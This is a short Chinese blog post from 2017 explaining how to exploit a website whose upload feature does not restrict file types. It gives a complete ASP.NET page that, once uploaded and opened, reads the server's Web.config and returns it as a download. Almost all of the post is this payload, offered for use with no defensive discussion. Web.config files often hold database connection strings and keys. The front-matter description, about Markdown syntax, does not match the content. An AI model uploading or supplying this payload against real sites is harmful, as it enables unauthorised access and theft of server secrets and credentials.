+++
author = "Raikay"
title = "通过一个一般处理程序（aspx文件)直接获取服务器web.config文件"
date = "2017-03-11"
description = "MarkDown基本语法以及相关工具笔记简单介绍"
tags = [
    "dotnet",
]

+++



如果某个网站的头像上传、文件上传等功能没限制文件格式，可上传一个aspx文件，然后直接执行

```html
<%@ Page Language="C#" ContentType="text/html" ResponseEncoding="gb2312" %>

<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>用户注册</title>
<script language="javascript">

</script>
<script language="c#" runat="server">
string result="";

//服务器上执行的方法
public void Page_Load(Object sender,EventArgs e)
{
            using (FileStream fs = new FileStream(Server.MapPath("/")+"Web.config", FileMode.Open, FileAccess.Read))
            {
                byte[] buffer = new byte[fs.Length];
                fs.Read(buffer, 0, buffer.Length);
                string msg = System.Text.Encoding.UTF8.GetString(buffer);
                //Response.Write(msg);

                string timeNow = DateTime.Now.ToString();
                Response.Clear();
                Response.Buffer = false;
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("content-disposition", "attachment;filename=" + "Web" + ".config;");

                Response.Write(msg);
                Response.Flush();
                Response.End();
            }
}
</script>
</head>
<body>

</body>
</html>
```

